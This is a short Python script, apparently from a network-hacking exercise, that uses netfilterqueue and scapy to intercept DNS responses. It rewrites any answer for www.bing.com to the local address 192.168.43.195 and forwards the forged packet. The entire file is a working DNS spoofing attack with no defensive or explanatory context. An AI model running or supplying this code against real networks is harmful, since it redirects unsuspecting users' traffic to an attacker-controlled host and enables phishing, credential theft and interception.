import netfilterqueue
import scapy.all as scapy

try:
    def process_packet(packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.DNSRR):
            qname = scapy_packet[scapy.DNSQR].qname
            web = b'www.bing.com'
            if web in qname:
                print("Spoofing")
                answer = scapy.DNSRR(rrname=qname, rdata="192.168.43.195")
                scapy_packet[scapy.DNS].an =answer
                scapy_packet[scapy.DNS].ancount = 1
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].chksum
                del scapy_packet[scapy.UDP].len
                packet.set_payload(bytes(scapy_packet))
        packet.accept()

    queue  = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("Exiting")